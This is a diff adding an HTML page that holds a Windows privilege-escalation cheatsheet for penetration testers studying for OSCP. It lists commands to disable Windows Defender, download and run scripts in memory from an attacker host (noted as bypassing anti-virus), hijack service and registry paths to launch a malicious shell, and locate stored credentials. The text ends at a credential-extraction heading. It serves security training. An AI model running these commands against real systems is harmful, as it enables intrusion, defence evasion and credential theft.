@@ -1,0 +1,1097 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Windows Privilege Escalation - Welcome to noobsec</title>
+
+    
+
+    
+    <meta name="keywords" content="windows cheatsheet,windows cheat sheet,windows privilege escalation,windows privesc,windows privilege escalation cheatsheet,windows privesc cheatsheet" />
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="Windows Privilege Escalation" />
+<meta property="og:description" content="Windows Privilege Escalation Cheatsheet Latest updated as of: 12 / June / 2022
+So you got a shell, what now?
+This post will help you with local enumeration as well as escalate your privileges further.
+Usage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS. If confused which executable to use, use this
+Keep in mind:
+To exploit services or registry, you require: appropriate write permissions service start permission service stop permission Look for non-standard programs on the system Note: This is a live document." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/privesc-windows/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2020-06-26T18:05:42+00:00" />
+<meta property="article:modified_time" content="2020-06-26T18:05:42+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Windows Privilege Escalation"/>
+<meta name="twitter:description" content="Windows Privilege Escalation Cheatsheet Latest updated as of: 12 / June / 2022
+So you got a shell, what now?
+This post will help you with local enumeration as well as escalate your privileges further.
+Usage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS. If confused which executable to use, use this
+Keep in mind:
+To exploit services or registry, you require: appropriate write permissions service start permission service stop permission Look for non-standard programs on the system Note: This is a live document."/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#binaries">Binaries</a></li>
+    <li><a href="#general-information">General Information</a>
+      <ul>
+        <li><a href="#who-am-i">Who am I?</a></li>
+        <li><a href="#do-i-have-anything-fun">Do I have anything fun?</a></li>
+        <li><a href="#where-am-i">Where am I?</a></li>
+        <li><a href="#anyone-home">Anyone home?</a></li>
+        <li><a href="#what-am-i-part-of">What am I part of?</a></li>
+        <li><a href="#what-is-this-place">What is this place?</a></li>
+        <li><a href="#is-it-fancy">Is it fancy?</a></li>
+        <li><a href="#am-i-tied-up">Am I tied up?</a></li>
+        <li><a href="#anything-reachable">Anything reachable?</a></li>
+        <li><a href="#what-does-the-inside-look-like">What does the inside look like?</a></li>
+        <li><a href="#leave-me-alone">Leave me alone</a></li>
+      </ul>
+    </li>
+    <li><a href="#file-transfer">File Transfer</a>
+      <ul>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#http">HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#automated-enumeration">Automated Enumeration</a>
+      <ul>
+        <li><a href="#winpeas">WinPEAS</a></li>
+        <li><a href="#exploit-suggester">Exploit suggester</a></li>
+        <li><a href="#powerup">PowerUp</a></li>
+      </ul>
+    </li>
+    <li><a href="#hacking-the-services">Hacking the Services</a>
+      <ul>
+        <li><a href="#checking-access-using-accesschkexe">Checking Access using Accesschk.exe</a></li>
+        <li><a href="#getting-acls">Getting ACLs</a></li>
+        <li><a href="#exploiting-services---scexe">Exploiting Services - sc.exe</a></li>
+      </ul>
+    </li>
+    <li><a href="#registry">Registry</a></li>
+    <li><a href="#credentials-or-hashes">Credentials or Hashes</a>
+      <ul>
+        <li><a href="#finding-credentials">Finding credentials</a></li>
+        <li><a href="#extracting-credentials">Extracting credentials</a></li>
+        <li><a href="#leverage-credentials">Leverage credentials</a></li>
+      </ul>
+    </li>
+    <li><a href="#runas">RunAs</a></li>
+    <li><a href="#find-files-fast">Find Files Fast</a></li>
+    <li><a href="#port-forwarding">Port Forwarding</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="windows-privilege-escalation-cheatsheet">Windows Privilege Escalation Cheatsheet</h1>
+<p>Latest updated as of: <em>12 / June / 2022</em></p>
+<p>So you got a shell, what <em>now</em>?<br>
+This post will help you with local enumeration as well as escalate your privileges further.</p>
+<p>Usage of different enumeration scripts and tools is encouraged, my favourite is <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a>. If confused which executable to use, use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe">this</a></p>
+<p>Keep in mind:</p>
+<ul>
+<li>To exploit services or registry, you require:
+<ul>
+<li>appropriate write permissions</li>
+<li>service start permission</li>
+<li>service stop permission</li>
+</ul>
+</li>
+<li>Look for non-standard programs on the system</li>
+</ul>
+<p><em>Note: This is a live document. I&rsquo;ll be adding more content as I learn</em></p>
+<h2 id="binaries">Binaries</h2>
+<p>Get 64-bit netcat from <a href="https://eternallybored.org/misc/netcat/">here</a>
+Get Chisel from <a href="https://github.com/jpillora/chisel/releases">here</a></p>
+<h2 id="general-information">General Information</h2>
+<p>If nothing is specified, assume command can be run on cmd.exe or powershell.exe</p>
+<h3 id="who-am-i">Who am I?</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">whoami
+echo %username%
+</code></pre>
+<h3 id="do-i-have-anything-fun">Do I have anything fun?</h3>
+<p>Notice groups you are part of and privileges you have</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">whoami /all
+</code></pre>
+<h3 id="where-am-i">Where am I?</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">hostname
+echo %hostname%
+</code></pre>
+<h3 id="anyone-home">Anyone home?</h3>
+<p>Local users</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net users
+</code></pre>
+<p>Domain users</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net users /domain
+</code></pre>
+<h3 id="what-am-i-part-of">What am I part of?</h3>
+<p>Local groups</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net groups
+</code></pre>
+<p>Domain groups</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net groups /domain
+</code></pre>
+<h3 id="what-is-this-place">What is this place?</h3>
+<pre  class="mc-prism hide language-text" ><code>systeminfo
+</code></pre>
+<h3 id="is-it-fancy">Is it fancy?</h3>
+<p>Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell.
+<br>
+Use PowerShell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">[environment]::Is64BitOperatingSystem
+[environment]::Is64BitProcess
+</code></pre>
+<h3 id="am-i-tied-up">Am I tied up?</h3>
+<p>Check LanguageMode. FullLanguage is nicer to have.<br>
+Use PowerShell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<h3 id="anything-reachable">Anything reachable?</h3>
+<p>Use PowerShell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-AppLockerPolicy -Effective
+Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
+</code></pre>
+<h3 id="what-does-the-inside-look-like">What does the inside look like?</h3>
+<p>Look for interesting services</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">netstat -ano
+</code></pre>
+<h3 id="leave-me-alone">Leave me alone</h3>
+<p>Do you have admin privs?<br></p>
+<p>Disable Windows Defender real time monitoring</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">Set-MpPreference -DisableRealTimeMonitoring $true	
+</code></pre>
+<p>Disable Windows Defender scanning for all files downloaded</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">Set-MpPreference -DisableIOAVProtection $true	
+</code></pre>
+<h2 id="file-transfer">File Transfer</h2>
+<h3 id="smb">SMB</h3>
+<p>On KALI, start smb server to serve files. Get impacket from <a href="https://github.com/SecureAuthCorp/impacket/releases/">here</a>
+<br></p>
+<blockquote>
+<p>Use double-quotes if file path has spaces in it</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">sudo impacket-smbserver abcd /path/to/serve
+</code></pre>
+<p>You can download files in multiple ways.<br>
+<strong>Mount drive</strong></p>
+<blockquote>
+<p>CMD or PowerShell</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net use abcd: \\kali_ip\myshare
+net use abcd: /d # disconnect
+net use abcd: /delete # then delete
+</code></pre>
+<blockquote>
+<p>PowerShell</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">New-PSDrive -Name &quot;abcd&quot; -PSProvider &quot;FileSystem&quot; -Root &quot;\\ip\abcd&quot;
+Remove-PSDrive -Name abcd
+</code></pre>
+<p><strong>Copy w/o mounting</strong></p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">copy //kali_ip/abcd/file_name C:\path\to\save
+copy C:\path\to\file //kali_ip/abcd
+</code></pre>
+<h3 id="http">HTTP</h3>
+<p>Load script in memory</p>
+<blockquote>
+<p>May help bypass trivial anti-virus solutions</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell.exe -nop -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://ip/file')&quot;
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell.exe iex (iwr http://ip/file -usebasicparsing)
+</code></pre>
+<p>Save to disk</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell.exe -nop -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')&quot;
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell.exe -nop -ep bypass -c &quot;IWR -URI 'http://ip/file' -Outfile '/path/to/file'&quot;
+</code></pre>
+<blockquote>
+<p>CMD or PowerShell</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">certutil -urlcache -f http://kali_ip/file file
+</code></pre>
+<h2 id="automated-enumeration">Automated Enumeration</h2>
+<h3 id="winpeas">WinPEAS</h3>
+<p>WinPEAS can be found <a href="https://github.com/carlospolop/PEASS-ng/releases">here</a></p>
+<p>For color, first apply below registry settings and then spawn a new shell</p>
+<pre  class="mc-prism hide language-text" ><code>REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\winpeasany.exe quiet
+</code></pre>
+<h3 id="exploit-suggester">Exploit suggester</h3>
+<p>This works well with older machines</p>
+<p>Windows exploit suggester can be found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">here</a>
+This script will be executed on Kali. First take the <code>systeminfo</code> info, paste it in a file</p>
+<p>An update may be required, it will generate the Excel file necessary</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\windows-exploit-suggester.py --update
+</code></pre>
+<p>Find vulns</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\windows-exploit-suggester.py -i systeminfo.txt -d 2022-xxx.xlsx
+</code></pre>
+<h3 id="powerup">PowerUp</h3>
+<p>PowerUp can be found <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">here</a><br>
+Although not entirely allowed, we can leverage its <code>Invoke-AllChecks</code> function to quickly find escalation points</p>
+<p>The script can be executed in multiple ways</p>
+<ol>
+<li>Save on disk, and execute</li>
+</ol>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell -ep bypass -c &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;
+</code></pre>
+<ol start="2">
+<li>Execute from memory</li>
+</ol>
+<p>Modify the script to contain <code>Invoke-AllChecks</code> at the bottom of the script</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">powershell.exe -nop -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1')&quot;
+</code></pre>
+<h2 id="hacking-the-services">Hacking the Services</h2>
+<h3 id="checking-access-using-accesschkexe">Checking Access using Accesschk.exe</h3>
+<p>Below should give you an idea of some of the useful flags</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell"># .\accesschk.exe /accepteula
+# -c : Name a windows service, or use * for all
+# -d : Only process directories
+# -k : Name a registry key e.g., hklm/software
+# -q : Omit banner
+# -s : Recurse
+# -u : Suppress errors
+# -v : Verbose
+# -w : Show objects with write access
+</code></pre>
+<p>Checking service permissions</p>
+<blockquote>
+<p>ALWAYS RUN THE FOLLOWING TO CHECK IF YOU&rsquo;VE PERMISSIONS TO START AND STOP THE SERVICE</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -ucqv &lt;user&gt; &lt;svc_name&gt;
+</code></pre>
+<p>Get all writable services as per groups</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteual -uwcqv Users *
+.\accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *
+</code></pre>
+<p>Check unquoted service paths by testing if directories are writable</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -uwdv &quot;C:\Program Files&quot;
+</code></pre>
+<p>Check user permissions on an executable</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -uqv &quot;C:\Program Files\abcd\file.exe&quot;
+</code></pre>
+<p>Find all weak permissions
+<br>
+Folders</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -uwdqs Users c:\
+.\accesschk.exe /accepteula -uwdqs &quot;Authenticated Users&quot; c:\
+</code></pre>
+<p>Files</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -uwqs Users c:\*.*
+.\accesschk.exe /accepteula -uwqs &quot;Authenticated Users&quot; c:\*.*
+</code></pre>
+<p>Weak registry permissions</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
+</code></pre>
+<h3 id="getting-acls">Getting ACLs</h3>
+<p>Can we do something about it?</p>
+<blockquote>
+<p>PowerShell</p>
+</blockquote>
+<p>Getting ACLs of services</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List
+</code></pre>
+<p>Get ACLs of any file or folder</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">(get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
+</code></pre>
+<h3 id="exploiting-services---scexe">Exploiting Services - sc.exe</h3>
+<p>Query service configuration</p>
+<blockquote>
+<p>Verify config after doing all the changes</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sc qc svc
+</code></pre>
+<p>What is the current state of the service?</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sc query svc
+</code></pre>
+<p>Modifying config</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sc config svc binpath= &quot;\&quot;C:\Downloads\shell.exe\&quot;&quot;
+</code></pre>
+<p>If dependencies exist, make it auto or NULL</p>
+<blockquote>
+<p>Check if you can restart the dependant svc</p>
+</blockquote>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sc config depend_svc start= auto
+net start depend_svc
+net start svc
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">sc config svc depend= &quot;&quot;
+</code></pre>
+<p>Turn it off and back on again</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">net start/stop svc
+</code></pre>
+<h2 id="registry">Registry</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell"># Query configuration of registry entry of the service
+reg query HKLM\System\CurrentControlSet\Services\svc_name
+
+# Point the ImagePath to malicious executable
+reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f
+
+# Start/stop the service to get the shell
+net start/stop svc
+
+# Execute a reverse_shell.msi as admin
+# Manually, both query's output should be 0x1 to exploit
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<h2 id="credentials-or-hashes">Credentials or Hashes</h2>
+<h3 id="finding-credentials">Finding credentials</h3>
+<p>Common creds location, always in plaintext</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin&quot;
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; /s
+</code></pre>
+<p>Look for interesting files that may contain creds</p>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">dir /s SAM
+dir /s SYSTEM
+dir /s Unattend.xml
+</code></pre>
+<h3 id="extracting-credentials">Extracting credentials</h3>
